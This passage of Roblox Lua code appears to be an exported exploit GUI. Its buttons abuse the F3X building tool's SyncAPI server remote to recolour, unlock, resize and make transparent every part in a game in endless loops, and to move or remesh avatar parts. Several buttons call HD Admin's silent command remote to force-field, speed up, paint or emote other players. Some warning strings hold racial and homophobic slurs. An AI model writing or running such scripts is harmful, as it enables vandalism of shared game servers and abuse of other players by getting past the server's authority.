task.spawn(C_75);
-- StarterGui.ScreenGui.Frame.F3X Scripts.TextButton.LocalScript
local function C_77()
local script = G2L["77"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))
					end)
				end
			end
		end
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
	
		function SetReflect(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Reflectance"] = int
					}
				}
			}
			_(args)
		end
	
	
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetTrans(v,math.random(0,1))
					end)
				end
			end 
		end
	
		function spam2(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetReflect(v,math.random(0,1))
					end)
				end
			end 
		end
		while true do
			spam()
			randomise()
			spam2()
			wait(1)
		end
	
	
	
	end)
end;
task.spawn(C_77);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_7a()
local script = G2L["7a"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
	
		-- find shit
		local tool
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		if not tool then
			warn("ไม่พบ SyncAPI Tool!")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
	
		local head = char:FindFirstChild("Head")
		if not head then
			warn("fuck fagz")
			return
		end
		local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
		if not headMesh then
			warn("nigga")
			return
		end
	
	
		local hats = {}
		for _, hat in pairs(char:GetChildren()) do
			if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
				local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
				if handleMesh then
					table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
				end
			end
		end
	
	
		local amplitude = 0.7
		local frequency = 6 
		local t = 0
	
		local RunService = game:GetService("RunService")
		RunService.RenderStepped:Connect(function(dt)
			t = t + dt * frequency
			local offsetValue = math.sin(t) * amplitude
	
	
			local partsToSync = {
				{Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}
			}
			for _, h in pairs(hats) do
				table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
			end
	
			remote:InvokeServer("SyncMesh", partsToSync)
		end)
	
	end)
end;
task.spawn(C_7a);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_7c()
local script = G2L["7c"];
	script.Parent.MouseButton1Click:Connect(function()
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
	
		local lp = Players.LocalPlayer
		local char = lp.Character or lp.CharacterAdded:Wait()
		local hum = char:WaitForChild("Humanoid")
		local torso = char:WaitForChild("Torso")
	
		local tool = char:FindFirstChildOfClass("Tool")
		if not tool then
			for _, v in lp.Backpack:GetChildren() do
				if v:IsA("Tool") then
					tool = v
					break
				end
			end
		end
	
		if tool then
			hum:EquipTool(tool)
			task.delay(0.01, function()
				hum:UnequipTools()
			end)
		end
	
		local server = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI:FindFirstChild("ServerEndpoint")
	
		local larm = char:WaitForChild("Left Arm")
		local rarm = char:WaitForChild("Right Arm")
	
		local idleAngles = Vector3.new(0,0,math.rad(-90))
		local flapAmplitude = Vector3.new(0, 0, math.rad(40))
		local flapSpeed = 14
	
		local targetL, targetR = larm.CFrame, rarm.CFrame
	
		RunService.RenderStepped:Connect(function(delta)
			if not larm or not rarm then return end
			local time = tick()
			local flapX = math.sin(time * flapSpeed) * flapAmplitude.X
			local flapY = math.sin(time * flapSpeed * 0.8) * flapAmplitude.Y
			local flapZ = math.sin(time * flapSpeed * 0.6) * flapAmplitude.Z
	
			if hum.MoveDirection.Magnitude == 0 then  
				targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(idleAngles.X, idleAngles.Y, idleAngles.Z)  
				targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-idleAngles.X, -idleAngles.Y, -idleAngles.Z)  
			else  
				targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(flapX, flapY, idleAngles.Z + flapZ)  
				targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-flapX, -flapY, -idleAngles.Z - flapZ)  
			end  
	
			larm.CFrame = targetL  
			rarm.CFrame = targetR
		end)
	
		if server then
			spawn(function()
				while true do
					if larm and rarm then
						server:InvokeServer("SyncMove", {{Part = larm, CFrame = larm.CFrame}})
						server:InvokeServer("SyncMove", {{Part = rarm, CFrame = rarm.CFrame}})
					end
					task.wait()
				end
			end)
		end
	
	end)
end;
task.spawn(C_7c);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_7e()
local script = G2L["7e"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";ff me") 
	
	
	end)
end;
task.spawn(C_7e);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_81()
local script = G2L["81"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function a()
			presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
			spawn(function()
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
							["UnionColoring"] = true
						},
						[2] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
							["UnionColoring"] = true
						},
						[3] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
							["UnionColoring"] = true
						},
						[4] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
							["UnionColoring"] = true
						},
						[5] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
							["UnionColoring"] = true
						},
						[6] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
							["UnionColoring"] = true
						},
						[7] = {
							["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
							["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
							["UnionColoring"] = true
						}
					}
				}
	
				_(args)
			end)
		end
	
		while true do
			wait()
			spawn(function()
				a()
			end)
		end
	
	end)
end;
task.spawn(C_81);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_83()
local script = G2L["83"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local warned = false
	
		-- Mesh Types
		local meshTypes = {
			Enum.MeshType.Brick,
			Enum.MeshType.Cylinder,
			Enum.MeshType.Head,
			Enum.MeshType.Sphere,
			Enum.MeshType.Wedge
		}
	
		-- หาเครื่องมือ SyncAPI
		local function getBuildingTool(player)
			for _, container in ipairs({player.Character, player.Backpack}) do
				if container then
					for _, item in ipairs(container:GetChildren()) do
						if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
							return item
						end
					end
				end
			end
			return nil
		end
	
		-- ลบ Mesh เดิม
		local function removemesh(part)
			for _, child in ipairs(part:GetChildren()) do
				if child:IsA("MeshPart") or child:IsA("SpecialMesh") then
					local args = {"Remove", { child }}
					local tool = getBuildingTool(player)
					if tool then
						tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
					elseif not warned then
						warn("Building tool not found")
						warned = true
					end
				end
			end
		end
	
		-- ตรวจสอบว่าเป็น Accessory หรือ Handle ของ Accessory
		local function isAccessoryPart(part)
			if part:IsA("Accessory") then
				return true
			end
			if part.Parent and part.Parent:IsA("Accessory") then
				return true
			end
			return false
		end
	
		-- สร้าง Mesh ใหม่
		local function applymesh(part)
			if isAccessoryPart(part) then
				return -- ข้ามหมวก/Accessory
			end
	
			removemesh(part)
	
			local currentMeshType
			local mesh = part:FindFirstChildWhichIsA("SpecialMesh")
			if mesh then
				currentMeshType = mesh.MeshType
			end
	
			local availableTypes = {}
			for _, mt in ipairs(meshTypes) do
				if mt ~= currentMeshType then
					table.insert(availableTypes, mt)
				end
			end
			local randomMeshType = availableTypes[math.random(1, #availableTypes)]
	
			local tool = getBuildingTool(player)
			if tool then
				local argsCreate = {"CreateMeshes", {{ Part = part }}}
				local argsSync   = {"SyncMesh",     {{ MeshType = randomMeshType, Part = part }}}
				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
				tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
			elseif not warned then
				warn("Building tool not found")
				warned = true
			end
		end
	
		-- เปลี่ยน Mesh ของตัวละคร
		local function randomizeCharacterMeshes(character)
			for _, obj in ipairs(character:GetDescendants()) do
				if (obj:IsA("Part") or obj:IsA("MeshPart")) and not isAccessoryPart(obj) then
					applymesh(obj)
				end
			end
		end
	
		-- หา SyncAPI Tool และฟังก์ชันเปลี่ยนสี
		local tool
		for _, v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent end
		end
		for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent end
		end
		local remote = tool.SyncAPI.ServerEndpoint
		function _(args) remote:InvokeServer(unpack(args)) end
	
		-- ฟังก์ชันเปลี่ยนสีตัวละคร
		function a()
			local presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
			spawn(function()
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.Head,["UnionColoring"]=true},
						[2] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.HumanoidRootPart,["UnionColoring"]=true},
						[3] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Left Arm"),["UnionColoring"]=true},
						[4] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Right Leg"),["UnionColoring"]=true},
						[5] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character.Torso,["UnionColoring"]=true},
						[6] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Right Arm"),["UnionColoring"]=true},
						[7] = {["Color"]=BrickColor.new(presets[math.random(#presets)]).Color,["Part"]=player.Character:FindFirstChild("Left Leg"),["UnionColoring"]=true}
					}
				}
				_(args)
			end)
		end
	
		-- ลูปหลัก
		while true do
			if player.Character then
				randomizeCharacterMeshes(player.Character)
			end
			wait()
			spawn(a)
		end
	
	
	end)
end;
task.spawn(C_83);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_85()
local script = G2L["85"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";speed me 60") 
	
	
	end)
end;
task.spawn(C_85);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_87()
local script = G2L["87"];
	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
	
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
	
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		local function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf, parent, types)
			local args = {
				[1] = "CreatePart",
				[2] = types or "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		function Color(part, color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color,
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
	
		function SetShape(part, shape)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Shape"] = shape
					}
				}
			}
			_(args)
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetLocked(part, boolean)
			local args = {
				[1] = "SetLocked",
				[2] = { [1] = part },
				[3] = boolean
			}
			_(args)
		end
	
		-- Build pad under player
		local padPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
		CreatePart(padPos, workspace, "Cylinder")
		task.wait(0.1)
	
		local floatingPad
	
		for i, v in workspace:GetChildren() do
			if v:IsA("BasePart")
				and (v.CFrame.Position - padPos.Position).Magnitude < 5
				and not v.Parent:FindFirstChild("Humanoid")
			then
				floatingPad = v
	
				Resize(floatingPad, Vector3.new(0.5, 8, 8), padPos * CFrame.Angles(0, 0, math.rad(90)))
				Color(floatingPad, Color3.fromRGB(107, 50, 124))
				SetCollision(floatingPad, true)
				SetLocked(floatingPad, true)
	
				break
			end
		end
	
		if floatingPad then
			local RunService = game:GetService("RunService")
	
			RunService.Heartbeat:Connect(function()
				pcall(function()
					if char and char:FindFirstChild("HumanoidRootPart") then
						local targetPos = char.HumanoidRootPart.CFrame * CFrame.new(0, -3.5, 0)
						MovePart(floatingPad, targetPos * CFrame.Angles(0, 0, math.rad(90)))
					end
				end)
			end)
		end
	
	
	end)
end;
task.spawn(C_87);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_89()
local script = G2L["89"];
	script.Parent.MouseButton1Click:Connect(function()
		while true do
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			RequestCommand:InvokeServer(";paint others Red")
			task.wait(2)
			RequestCommand:InvokeServer(";paint others Green")
			task.wait(2)
			RequestCommand:InvokeServer(";paint others Purple")
			task.wait(2)
			RequestCommand:InvokeServer(";paint others Orange")
			task.wait(2)
			RequestCommand:InvokeServer(";paint others White")
			task.wait(2)
			RequestCommand:InvokeServer(";paint others Red")
			wait(2)
		end
	
	end)
end;
task.spawn(C_89);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_8b()
local script = G2L["8b"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";emote me 134442882516163")
	
	end)
end;
task.spawn(C_8b);
-- StarterGui.ScreenGui.Frame.Player Scripts.TextButton.LocalScript
local function C_8d()
local script = G2L["8d"];
	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";emote all 134442882516163")
	
	end)
end;
task.spawn(C_8d);
-- StarterGui.ScreenGui.Frame.LocalScript
local function C_8e()
local script = G2L["8e"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		-- Smoothly transition the UI to the new position
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_8e);

return G2L["1"], require;